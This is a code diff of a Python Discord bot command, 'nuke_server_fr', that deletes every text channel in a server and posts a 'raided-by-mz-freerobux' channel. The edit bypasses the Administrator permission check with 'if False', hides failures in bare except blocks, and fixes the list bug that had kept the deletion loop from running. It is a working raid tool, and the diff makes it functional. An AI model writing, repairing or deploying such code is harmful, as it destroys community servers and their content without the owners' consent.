@@ -475,34 +475,33 @@ async def nuke_server_fr(ctx):
             except:
                 None
                 
-        async def nuke_channel_2(txt):
-            if False:
-                print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
-                await txt.send("You don't have `Administrator` Permissions!")
-            else:
+        if False:
+            print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
+            await txt.send("You don't have `Administrator` Permissions!")
+        else:
                 
+            try:
                 try:
-                    try:
-                        text_channel_list = []
+                    text_channel_list = []
                         
-                        for channel in ctx.guild.text_channels:
-                            text_channel_list = text_channel_list.append(channel)
+                    for channel in ctx.guild.text_channels:
+                        text_channel_list.append(channel)
 
-                        for channel in text_channel_list:
-                            try:
-                                await channel.delete()
-                            except:
-                                None
+                    for channel in text_channel_list:
+                        try:
+                            await channel.delete()
+                        except:
+                            None
 
-                    except:
-                        None
-
-                    finally:
-                        None
                 except:
                     None
+
                 finally:
                     None
+            except:
+                None
+            finally:
+                None
             
             guild = ctx.message.guild
             newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
